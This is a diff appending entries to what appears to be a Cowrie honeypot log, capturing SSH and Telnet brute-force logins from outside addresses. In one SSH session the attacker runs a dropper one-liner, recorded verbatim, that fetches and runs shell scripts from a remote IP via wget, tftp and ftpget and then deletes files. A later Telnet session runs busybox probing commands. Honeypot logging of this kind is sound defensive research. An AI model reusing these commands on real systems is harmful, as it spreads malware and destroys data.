@@ -6193,3 +6193,66 @@
 2017-06-10T11:38:58+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,17817,154.16.3.104] login attempt: 150
 2017-06-10T11:38:58+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,17817,154.16.3.104] login return, expect: [1111/1111]
 2017-06-10T11:39:00+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,17817,154.16.3.104] login attempt [1111/1111] succeeded
+2017-06-10T11:39:02+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,17817,154.16.3.104] '1111' authenticated with 'password'
+2017-06-10T11:39:02+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,17817,154.16.3.104] starting service 'ssh-connection'
+2017-06-10T11:39:02+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,17817,154.16.3.104] got channel 'session' request
+2017-06-10T11:39:02+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,17817,154.16.3.104] channel open
+2017-06-10T11:39:02+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,17817,154.16.3.104] executing command "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://107.174.34.70/Swag.sh; chmod 777 Swag.sh; sh Swag.sh; tftp 107.174.34.70 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 107.174.34.70; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 107.174.34.70 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf Swag.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *"
+2017-06-10T11:39:02+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,17817,154.16.3.104] Opening TTY Log: log/tty/20170610-113902-e7c2457b-0e.log
+2017-06-10T11:39:02+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,17817,154.16.3.104] CMD: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://107.174.34.70/Swag.sh; chmod 777 Swag.sh; sh Swag.sh; tftp 107.174.34.70 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 107.174.34.70; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 107.174.34.70 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf Swag.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *
+2017-06-10T11:39:02+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,17817,154.16.3.104] Command found: cd /tmp
+2017-06-10T11:39:02+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,17817,154.16.3.104] Command found: cd /var/run
+2017-06-10T11:39:02+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,17817,154.16.3.104] Command found: cd /mnt
+2017-06-10T11:39:02+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,17817,154.16.3.104] Command found: cd /root
+2017-06-10T11:39:02+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,17817,154.16.3.104] Command found: cd /
+2017-06-10T11:39:02+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,17817,154.16.3.104] Command found: wget http://107.174.34.70/Swag.sh
+2017-06-10T11:39:02+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Starting factory <HTTPProgressDownloader: http://107.174.34.70/Swag.sh>
+2017-06-10T11:39:12+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,17817,154.16.3.104] received eof, sending ctrl-d to command
+2017-06-10T11:39:12+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,17817,154.16.3.104] remote close
+2017-06-10T11:39:12+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,17817,154.16.3.104] Closing TTY Log: log/tty/20170610-113902-e7c2457b-0e.log after 10 seconds
+2017-06-10T11:39:12+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,17817,154.16.3.104] honeypot terminal protocol connection lost [Failure instance: Traceback (failure with no frames): <class 'twisted.internet.error.ConnectionDone'>: Connection was closed cleanly.
+	]
+2017-06-10T11:39:12+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,17817,154.16.3.104] sending close 0
+2017-06-10T11:39:12+0000 [HoneyPotSSHTransport,17817,154.16.3.104] avatar 1111 logging out
+2017-06-10T11:39:12+0000 [HoneyPotSSHTransport,17817,154.16.3.104] connection lost
+2017-06-10T11:39:12+0000 [HoneyPotSSHTransport,17817,154.16.3.104] Connection lost after 14 seconds
+2017-06-10T11:39:32+0000 [-] Connection was probably lost. Could not write to terminal
+2017-06-10T11:39:32+0000 [-] Connection was probably lost. Could not write to terminal
+2017-06-10T11:39:32+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Stopping factory <HTTPProgressDownloader: http://107.174.34.70/Swag.sh>
+2017-06-10T11:39:35+0000 [cowrie.telnet.transport.HoneyPotTelnetFactory] New connection: 118.172.43.10:48799 (10.8.41.81:2223) [session: TT36142]
+2017-06-10T11:39:37+0000 [CowrieTelnetTransport,36142,118.172.43.10] login attempt: 5
+2017-06-10T11:39:37+0000 [CowrieTelnetTransport,36142,118.172.43.10] login return, expect: [root/klv1234]
+2017-06-10T11:39:39+0000 [CowrieTelnetTransport,36142,118.172.43.10] login attempt [root/zlxx.] failed
+2017-06-10T11:39:39+0000 [CowrieTelnetTransport,36142,118.172.43.10] Warning: state changed and new state returned
+2017-06-10T11:39:39+0000 [cowrie.telnet.transport.HoneyPotTelnetFactory] New connection: 175.0.61.90:56403 (10.8.41.81:2223) [session: TT36143]
+2017-06-10T11:39:40+0000 [CowrieTelnetTransport,36142,118.172.43.10] Connection lost after 4 seconds
+2017-06-10T11:39:43+0000 [CowrieTelnetTransport,36143,175.0.61.90] first time for 175.0.61.90, need: 1
+2017-06-10T11:39:43+0000 [CowrieTelnetTransport,36143,175.0.61.90] login attempt: 1
+2017-06-10T11:39:45+0000 [CowrieTelnetTransport,36143,175.0.61.90] login attempt [guest/guest] succeeded
+2017-06-10T11:39:47+0000 [CowrieTelnetTransport,36143,175.0.61.90] Opening TTY Log: log/tty/20170610-113947-None-36143i.log
+2017-06-10T11:39:47+0000 [CowrieTelnetTransport,36143,175.0.61.90] Warning: state changed and new state returned
+2017-06-10T11:39:49+0000 [CowrieTelnetTransport,36143,175.0.61.90] CMD: enable
+2017-06-10T11:39:49+0000 [CowrieTelnetTransport,36143,175.0.61.90] Command found: enable 
+2017-06-10T11:39:49+0000 [CowrieTelnetTransport,36143,175.0.61.90] Reading txtcmd from "txtcmds/bin/enable"
+2017-06-10T11:39:49+0000 [CowrieTelnetTransport,36143,175.0.61.90] CMD: system
+2017-06-10T11:39:49+0000 [CowrieTelnetTransport,36143,175.0.61.90] Command not found: system
+2017-06-10T11:39:50+0000 [CowrieTelnetTransport,36143,175.0.61.90] CMD: shell
+2017-06-10T11:39:50+0000 [CowrieTelnetTransport,36143,175.0.61.90] Command not found: shell
+2017-06-10T11:39:51+0000 [CowrieTelnetTransport,36143,175.0.61.90] CMD: sh
+2017-06-10T11:39:51+0000 [CowrieTelnetTransport,36143,175.0.61.90] Command found: sh 
+2017-06-10T11:39:51+0000 [CowrieTelnetTransport,36143,175.0.61.90] CMD:  /bin/busybox wget; /bin/busybox 81c46036wget; /bin/busybox echo -ne '\x0181c46036\x7f'; /bin/busybox printf '\00281c46036\177'; /bin/echo -ne '\x0381c46036\x7f'; /usr/bin/printf '\00481c46036\177'; /bin/busybox tftp; /bin/busybox 81c46036tftp;
+2017-06-10T11:39:51+0000 [CowrieTelnetTransport,36143,175.0.61.90] Command found: /bin/busybox wget
+2017-06-10T11:39:51+0000 [CowrieTelnetTransport,36143,175.0.61.90] Command found: wget
+2017-06-10T11:39:51+0000 [CowrieTelnetTransport,36143,175.0.61.90] Command found: /bin/busybox 81c46036wget
+2017-06-10T11:39:51+0000 [CowrieTelnetTransport,36143,175.0.61.90] Command found: /bin/busybox echo -ne '\x0181c46036\x7f'
+2017-06-10T11:39:51+0000 [CowrieTelnetTransport,36143,175.0.61.90] Command found: echo -ne '\x0181c46036\x7f'
+2017-06-10T11:39:51+0000 [CowrieTelnetTransport,36143,175.0.61.90] Command found: /bin/busybox printf '\00281c46036\177'
+2017-06-10T11:39:51+0000 [CowrieTelnetTransport,36143,175.0.61.90] Command found: /bin/echo -ne '\x0381c46036\x7f'
+2017-06-10T11:39:51+0000 [CowrieTelnetTransport,36143,175.0.61.90] Command not found: /usr/bin/printf '\00481c46036\177'
+2017-06-10T11:39:51+0000 [CowrieTelnetTransport,36143,175.0.61.90] Command found: /bin/busybox tftp
+2017-06-10T11:39:51+0000 [CowrieTelnetTransport,36143,175.0.61.90] Command found: tftp
+2017-06-10T11:39:51+0000 [CowrieTelnetTransport,36143,175.0.61.90] Command found: /bin/busybox 81c46036tftp
+2017-06-10T11:39:52+0000 [CowrieTelnetTransport,36143,175.0.61.90] CMD:  /bin/busybox dd if=/bin/busybox bs=22 count=1 || /bin/busybox cat /bin/busybox
+2017-06-10T11:39:52+0000 [CowrieTelnetTransport,36143,175.0.61.90] Command found: /bin/busybox dd if=/bin/busybox bs=22 count=1
+2017-06-10T11:39:52+0000 [CowrieTelnetTransport,36143,175.0.61.90] Command found: /bin/busybox cat /bin/busybox
+2017-06-10T11:39:52+0000 [CowrieTelnetTransport,36143,175.0.61.90] Command found: cat /bin/busybox
